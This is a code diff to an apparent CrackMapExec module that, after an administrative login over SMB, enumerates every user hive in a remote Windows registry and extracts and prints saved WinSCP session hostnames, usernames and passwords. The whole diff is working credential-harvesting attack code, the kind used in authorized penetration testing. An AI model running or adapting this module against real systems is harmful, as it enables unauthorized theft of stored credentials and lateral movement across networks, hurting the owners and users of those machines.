@@ -5,7 +5,9 @@
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5 import rrp
 from impacket.examples.secretsdump import RemoteOperations
+from impacket.smbconnection import SessionError
 from urllib.parse import unquote
+import re
 
 class CMEModule:
     '''
@@ -20,8 +22,7 @@ class CMEModule:
     def options(self, context, module_options):
         """
         SEARCH_PATH     Specify the search Path if you already found a WinSCP.ini file or you want to change the default Paths (you must add single quotes around the paths if they include spaces)
-                        Default: 'C:\\Users\\{u}\\AppData\\Roaming\\WinSCP.ini',
-                        'C:\\Users\\{u}\\Documents\\WinSCP.ini'
+                        Default: 'C:\\Users\\{u}\\AppData\\Roaming\\WinSCP.ini','C:\\Users\\{u}\\Documents\\WinSCP.ini'
         """
         if 'SEACH_PATH' in module_options:
             self.filepath = module_options['SEACH_PATH']
@@ -92,21 +93,17 @@ class CMEModule:
 
 
     # ==================== Handle Registry ====================
-    def registrySessionExtractor(self, context, connection, sessionName):
+    def registrySessionExtractor(self, context, connection, userObject, sessionName):
         try:
             remoteOps = RemoteOperations(connection.conn, False)
             remoteOps.enableRegistry()
 
-            ans = rrp.hOpenCurrentUser(remoteOps._RemoteOperations__rrp)
+            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
             regHandle = ans['phKey']
 
-            try:
-                
-                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'Software\\Martin Prikryl\\WinSCP 2\\Sessions\\' + sessionName)
-                keyHandle = ans['phkResult']
-            except:
-                traceback.print_exc()
-            
+            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, userObject + '\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\' + sessionName)
+            keyHandle = ans['phkResult']
+
             hostName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'HostName')[1].split('\x00')[:-1][0]
             userName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UserName')[1].split('\x00')[:-1][0]
             try: 
@@ -127,47 +124,90 @@ class CMEModule:
             remoteOps.finish()
             
         return "ERROR IN SESSION EXTRACTION"
+    def findAllUsersInRegistry(self, context, connection):
+        userObjects = []
+
+        try:
+            remoteOps = RemoteOperations(connection.conn, False)
+            remoteOps.enableRegistry()
+
+            # Enumerate all Users on System
+            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
+            regHandle = ans['phKey']
+
+            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, '')
+            keyHandle = ans['phkResult']
+
+            data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)
+            users = data['lpcSubKeys']
+
+            # Get User Names
+            userNames = []
+            for i in range(users):
+                userNames.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)['lpNameOut'].split('\x00')[:-1][0])
+            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
+
+            # Filter legit users in regex
+            userNames.remove('.DEFAULT')
+            regex = re.compile(r'^.*_Classes$')
+            userObjects = [i for i in userNames if not regex.match(i)]
+        except:
+            context.log.error("Error handling Users in registry")
+            traceback.print_exc()
+        finally:
+            remoteOps.finish()
+        return userObjects
 
     def registryDiscover(self, context, connection):
         try:
             remoteOps = RemoteOperations(connection.conn, False)
             remoteOps.enableRegistry()
 
-            # Retrieve how many sessions are stored in registry
-            try:
-                ans = rrp.hOpenCurrentUser(remoteOps._RemoteOperations__rrp)
-                regHandle = ans['phKey']
+            # Enumerate all Users on System
+            userObjects = self.findAllUsersInRegistry(context, connection)
 
-                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'Software\\Martin Prikryl\\WinSCP 2\\Sessions')
-                keyHandle = ans['phkResult']
+            # Retrieve how many sessions are stored in registry from each UserObject
+            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
+            regHandle = ans['phKey']
 
-                data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)
+            for userObject in userObjects:
+                try:
+                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, userObject + '\\Software\\Martin Prikryl\\WinSCP 2\\Sessions')
+                    keyHandle = ans['phkResult']
 
-                sessions = data['lpcSubKeys']
-                context.log.success("Found {} sessions in registry!".format(sessions - 1))
-                
-                # Get Session Names
-                sessionNames = []
-                for i in range(sessions):
-                    sessionNames.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)['lpNameOut'].split('\x00')[:-1][0])
-                rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
-                sessionNames.remove('Default%20Settings')
+                    data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)
+                    sessions = data['lpcSubKeys']
+                    context.log.success("Found {} sessions for userObject {} in registry!".format(sessions - 1, userObject))
+                    
+                    # Get Session Names
+                    sessionNames = []
+                    for i in range(sessions):
+                        sessionNames.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)['lpNameOut'].split('\x00')[:-1][0])
+                    rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
+                    sessionNames.remove('Default%20Settings')
 
-                # Extract stored Session infos
-                for sessionName in sessionNames:
-                    self.printCreds(context, self.registrySessionExtractor(context, connection, sessionName))
-            except:
-                context.log.error("No WinSCP config found in registry")
-                traceback.print_exc()
-
+                    # Extract stored Session infos
+                    for sessionName in sessionNames:
+                        self.printCreds(context, self.registrySessionExtractor(context, connection, userObject, sessionName))
+                except Exception as e:
+                    if str(e).find('ERROR_FILE_NOT_FOUND'):
+                        # TODO change error to debug
+                        context.log.error("No WinSCP config found in registry")
+                    else:
+                        context.log.error("Unexpected error:")
+                        traceback.print_exc()
         finally:
             remoteOps.finish()
 
     # ==================== Handle Configs ====================
 
     def on_login(self, context, connection):
+        pass
+
+    def on_admin_login(self, context, connection):
         #context.log.error("Hello World")
         #context.log.info("Info")
         #context.log.highlight("HIGHLIGHT")
         #context.log.success("SUCCESS")
         self.registryDiscover(context, connection)
+
